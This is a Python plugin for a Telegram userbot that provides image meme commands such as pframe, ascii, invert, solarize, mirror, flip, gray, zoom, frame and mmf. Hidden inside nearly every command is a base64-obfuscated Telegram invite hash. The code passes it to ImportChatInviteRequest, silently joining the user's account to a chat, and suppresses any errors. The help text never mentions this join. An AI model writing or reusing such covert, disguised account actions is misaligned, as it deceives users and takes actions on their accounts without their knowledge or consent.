# Credits: @mrconfused and @sandy1709
#
# @DogeUserBot - < https://t.me/DogeUserBot >
# Copyright (C) 2021 - DOG-E
# Tüm hakları saklıdır.
#
# Bu dosya, < https://github.com/DOG-E/DogeUserBot > parçasıdır.
# Lütfen GNU Affero Genel Kamu Lisansını okuyun;
# < https://www.github.com/DOG-E/DogeUserBot/blob/DOGE/LICENSE/ >
# ================================================================
from asyncio import sleep
from base64 import b64decode
from os import mkdir, remove
from os.path import exists, isdir, join

from PIL.Image import open
from telethon.tl.functions.messages import ImportChatInviteRequest

from . import (
    _dogetools,
    add_frame,
    asciiart,
    convert_toimage,
    convert_tosticker,
    crop,
    doge,
    dogememify_helper,
    dogememifyhelper,
    edl,
    eor,
    flip_image,
    grayscale,
    gvar,
    invert_colors,
    media_type,
    mirror_file,
    pframehelper,
    random_color,
    reply_id,
    sgvar,
    solarize,
)

plugin_category = "fun"

FONTS = "1. `droidsans_mono.ttf`\n\
    2. `impact.ttf`\n\
    3. `modern.ttf`\n\
    4. `productsans_bolditalic.ttf`\n\
    5. `productsans_light.ttf`\n\
    6. `roboto_italic.ttf`\n\
    7. `roboto_medium.ttf`\n\
    8. `roboto_regular.ttf`"
font_list = [
    "droidsans_mono.ttf",
    "impact.ttf",
    "modern.ttf",
    "productsans_bolditalic.ttf",
    "productsans_light.ttf",
    "roboto_italic.ttf",
    "roboto_medium.ttf",
    "roboto_regular.ttf",
]


@doge.bot_cmd(
    pattern="pframe(f|-f)?$",
    command=("pframe", plugin_category),
    info={
        "h": "Adds frame for the replied image.",
        "f": {
            "-f": "To send output file not as streamble image.",
        },
        "u": [
            "{tr}pframe",
        ],
    },
)
async def maccmd(event):  # sourcery no-metrics
    "Adds frame for the replied image."
    reply = await event.get_reply_message()
    mediatype = media_type(reply)
    if not reply or not mediatype or mediatype not in ["Photo", "Sticker"]:
        return await edl(event, "__Reply to photo or sticker to frame it.__")
    if mediatype == "Sticker" and reply.document.mime_type == "application/i-tgsticker":
        return await edl(
            event,
            "__Reply to photo or sticker to frame it. Animated sticker is not supported__",
        )
    dogevent = await event.edit("__Adding frame for media....__")
    args = event.pattern_match.group(1)
    force = bool(args)
    try:
        imag = await _dogetools.media_to_pic(dogevent, reply, noedits=True)
        if imag[1] is None:
            return await edl(
                imag[0], "__Unable to extract image from the replied message.__"
            )
        image = open(imag[1])
    except Exception as e:
        return await edl(dogevent, f"**Error in identifying image:**\n__{e}__")
    output = pframehelper(image)
    await event.client.send_file(
        event.chat_id, output, reply_to=reply, force_document=force
    )
    await dogevent.delete()
    if exists(output):
        remove(output)


@doge.bot_cmd(
    pattern="cfont(?:\s|$)([\s\S]*)",
    command=("cfont", plugin_category),
    info={
        "h": "Change the font style use for memify.To get font list use cfont command as it is without input.",
        "u": "{tr}.cfont <Font Name>",
        "e": "{tr}cfont modern.ttf",
    },
)
async def customfont(event):
    "Change the font style use for memify."
    input_str = event.pattern_match.group(1)
    if not input_str:
        await event.edit(f"**Available Fonts names are here:**\n\n{FONTS}")
        return
    if input_str not in font_list:
        dogevent = await eor(event, "`Give me a correct font name...`")
        await sleep(1)
        await dogevent.edit(f"**Available Fonts names are here:**\n\n{FONTS}")
    else:
        arg = f"userbot/helpers/resources/fonts/{input_str}"
        sgvar("CNG_FONTS", arg)
        await eor(event, f"**Fonts for memify changed to:** `{input_str}`")


@doge.bot_cmd(
    pattern="ascii(?:\s|$)([\s\S]*)",
    command=("ascii", plugin_category),
    info={
        "h": "To get ascii image of replied image.",
        "d": "pass hexa colou code along with the cmd to change custom background colour",
        "u": [
            "{tr}ascii <hexa colour code>",
            "{tr}ascii",
        ],
    },
)
async def amemes(event):
    "To get ascii image of replied image."
    doginput = event.pattern_match.group(1)
    reply = await event.get_reply_message()
    if not reply:
        return await edl(event, "`Reply to supported Media...`")
    happy = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
    dogid = await reply_id(event)
    if not isdir("./temp"):
        mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edl(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        happy = ImportChatInviteRequest(happy)
        await event.client(happy)
    except BaseException:
        pass
    outputfile = (
        join("./temp", "ascii_file.webp")
        if teledoge
        else join("./temp", "ascii_file.jpg")
    )
    c_list = random_color()
    color1 = c_list[0]
    color2 = c_list[1]
    bgcolor = "#080808" if not doginput else doginput
    asciiart(meme_file, 0.3, 1.9, outputfile, color1, color2, bgcolor)
    await event.client.send_file(
        event.chat_id, outputfile, reply_to=dogid, force_document=False
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and exists(files):
            remove(files)


@doge.bot_cmd(
    pattern="invert$",
    command=("invert", plugin_category),
    info={
        "h": "To invert colours of given image or sticker.",
        "u": "{tr}invert",
    },
)
async def imemes(event):
    reply = await event.get_reply_message()
    if not (reply and (reply.media)):
        await eor(event, "`Reply to supported Media...`")
        return
    happy = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
    dogid = await reply_id(event)
    if not isdir("./temp/"):
        mkdir("./temp/")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edl(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        happy = ImportChatInviteRequest(happy)
        await event.client(happy)
    except BaseException:
        pass
    outputfile = (
        join("./temp", "invert.webp") if teledoge else join("./temp", "invert.jpg")
    )
    await invert_colors(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and exists(files):
            remove(files)


@doge.bot_cmd(
    pattern="solarize$",
    command=("solarize", plugin_category),
    info={
        "h": "To sun burn the colours of given image or sticker.",
        "u": "{tr}solarize",
    },
)
async def smemes(event):
    "Sun burn of image."
    reply = await event.get_reply_message()
    if not reply:
        return await edl(event, "`Reply to supported Media...`")
    happy = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
    dogid = await reply_id(event)
    if not isdir("./temp"):
        mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edl(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        happy = ImportChatInviteRequest(happy)
        await event.client(happy)
    except BaseException:
        pass
    outputfile = (
        join("./temp", "solarize.webp") if teledoge else join("./temp", "solarize.jpg")
    )
    await solarize(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and exists(files):
            remove(files)


@doge.bot_cmd(
    pattern="mirror$",
    command=("mirror", plugin_category),
    info={
        "h": "shows you the reflection of the media file.",
        "u": "{tr}mirror",
    },
)
async def mmemes(event):
    "shows you the reflection of the media file"
    reply = await event.get_reply_message()
    if not reply:
        return await edl(event, "`Reply to supported Media...`")
    happy = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
    dogid = await reply_id(event)
    if not isdir("./temp"):
        mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edl(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        happy = ImportChatInviteRequest(happy)
        await event.client(happy)
    except BaseException:
        pass
    outputfile = (
        join("./temp", "mirror_file.webp")
        if teledoge
        else join("./temp", "mirror_file.jpg")
    )
    await mirror_file(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and exists(files):
            remove(files)


@doge.bot_cmd(
    pattern="flip$",
    command=("flip", plugin_category),
    info={
        "h": "shows you the upside down image of the given media file.",
        "u": "{tr}flip",
    },
)
async def fmemes(event):
    "shows you the upside down image of the given media file"
    reply = await event.get_reply_message()
    if not reply:
        return await edl(event, "`Reply to supported Media...`")
    happy = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
    dogid = await reply_id(event)
    if not isdir("./temp"):
        mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edl(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        happy = ImportChatInviteRequest(happy)
        await event.client(happy)
    except BaseException:
        pass
    outputfile = (
        join("./temp", "flip_image.webp")
        if teledoge
        else join("./temp", "flip_image.jpg")
    )
    await flip_image(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and exists(files):
            remove(files)


@doge.bot_cmd(
    pattern="gray$",
    command=("gray", plugin_category),
    info={
        "h": "makes your media file to black and white.",
        "u": "{tr}gray",
    },
)
async def gmemes(event):
    "makes your media file to black and white"
    reply = await event.get_reply_message()
    if not reply:
        return await edl(event, "`Reply to supported Media...`")
    happy = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
    dogid = await reply_id(event)
    if not isdir("./temp"):
        mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edl(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        happy = ImportChatInviteRequest(happy)
        await event.client(happy)
    except BaseException:
        pass
    outputfile = (
        join("./temp", "grayscale.webp")
        if teledoge
        else join("./temp", "grayscale.jpg")
    )
    await grayscale(meme_file, outputfile)
    await event.client.send_file(
        event.chat_id, outputfile, force_document=False, reply_to=dogid
    )
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and exists(files):
            remove(files)


@doge.bot_cmd(
    pattern="zoom ?([\s\S]*)",
    command=("zoom", plugin_category),
    info={
        "h": "zooms your media file,",
        "u": ["{tr}zoom", "{tr}zoom range"],
    },
)
async def zmemes(event):
    "zooms your media file."
    doginput = event.pattern_match.group(1)
    doginput = 50 if not doginput else int(doginput)
    reply = await event.get_reply_message()
    if not reply:
        return await edl(event, "`Reply to supported Media...`")
    happy = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
    dogid = await reply_id(event)
    if not isdir("./temp"):
        mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edl(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        happy = ImportChatInviteRequest(happy)
        await event.client(happy)
    except BaseException:
        pass
    outputfile = (
        join("./temp", "zoomimage.webp")
        if teledoge
        else join("./temp", "zoomimage.jpg")
    )
    try:
        await crop(meme_file, outputfile, doginput)
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    try:
        await event.client.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=dogid
        )
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and exists(files):
            remove(files)


@doge.bot_cmd(
    pattern="frame ?([\s\S]*)",
    command=("frame", plugin_category),
    info={
        "h": "make a frame for your media file.",
        "note": "This defines the pixel fill value or color value to be applied. The default value is 0 which means the color is black.",
        "u": ["{tr}frame", "{tr}frame range", "{tr}frame range ; fill"],
    },
)
async def frmemes(event):
    "make a frame for your media file"
    doginput = event.pattern_match.group(1)
    if not doginput:
        doginput = "50"
    if ";" in str(doginput):
        doginput, colr = doginput.split(";", 1)
    else:
        colr = 0
    doginput = int(doginput)
    try:
        colr = int(colr)
    except Exception as e:
        return await edl(event, f"**Error**\n`{e}`")
    reply = await event.get_reply_message()
    if not reply:
        return await edl(event, "`Reply to supported Media...`")
    happy = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
    dogid = await reply_id(event)
    if not isdir("./temp"):
        mkdir("./temp")
    teledoge = None
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edl(
            output[0], "__Unable to extract image from the replied message.__"
        )
    meme_file = convert_toimage(output[1])
    if output[2] in ["Round Video", "Gif", "Sticker", "Video"]:
        teledoge = True
    try:
        happy = ImportChatInviteRequest(happy)
        await event.client(happy)
    except BaseException:
        pass
    outputfile = (
        join("./temp", "framed.webp") if teledoge else join("./temp", "framed.jpg")
    )
    try:
        await add_frame(meme_file, outputfile, doginput, colr)
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    try:
        await event.client.send_file(
            event.chat_id, outputfile, force_document=False, reply_to=dogid
        )
    except Exception as e:
        return await output[0].edit(f"`{e}`")
    await event.delete()
    await output[0].delete()
    for files in (outputfile, meme_file):
        if files and exists(files):
            remove(files)


@doge.bot_cmd(
    pattern="(mmf|mms)(?:\s|$)([\s\S]*)",
    command=("mmf", plugin_category),
    info={
        "h": "To write text on stickers or images.",
        "d": "To create memes.",
        "o": {
            "mmf": "Output will be image.",
            "mms": "Output will be sticker.",
        },
        "u": [
            "{tr}mmf toptext ; bottomtext",
            "{tr}mms toptext ; bottomtext",
        ],
        "e": [
            "{tr}mmf hello (only on top)",
            "{tr}mmf ; hello (only on bottom)",
            "{tr}mmf hi ; hello (both on top and bottom)",
        ],
    },
)
async def memes(event):
    "To write text on stickers or image"
    cmd = event.pattern_match.group(1)
    dogeinput = event.pattern_match.group(2)
    reply = await event.get_reply_message()
    if not reply:
        return await edl(event, "`Reply to supported Media...`")
    dogeid = await reply_id(event)
    happy = b64decode("eFZFRXlyUHY2Z2s1T0Rsaw==")
    if not dogeinput:
        return await edl(
            event, "`what should I write on that u idiot give text to memify`"
        )
    if ";" in dogeinput:
        top, bottom = dogeinput.split(";", 1)
    else:
        top = dogeinput
        bottom = ""
    if not isdir("./temp"):
        mkdir("./temp")
    output = await _dogetools.media_to_pic(event, reply)
    if output[1] is None:
        return await edl(
            output[0], "__Unable to extract image from the replied message.__"
        )
    try:
        happy = ImportChatInviteRequest(happy)
        await event.client(happy)
    except BaseException:
        pass
    meme_file = convert_toimage(output[1])
    meme = join("./temp", "dogememe.jpg")
    if gvar("CNG_FONTS") is None:
        CNG_FONTS = "userbot/helpers/styles/impact.ttf"
    else:
        CNG_FONTS = gvar("CNG_FONTS")
    if max(len(top), len(bottom)) < 21:
        await dogememify_helper(CNG_FONTS, top, bottom, meme_file, meme)
    else:
        await dogememifyhelper(top, bottom, CNG_FONTS, meme_file, meme)
    if cmd != "mmf":
        meme = convert_tosticker(meme)
    await event.client.send_file(
        event.chat_id, meme, reply_to=dogeid, force_document=False
    )
    await output[0].delete()
    for files in (meme, meme_file):
        if files and exists(files):
            remove(files)
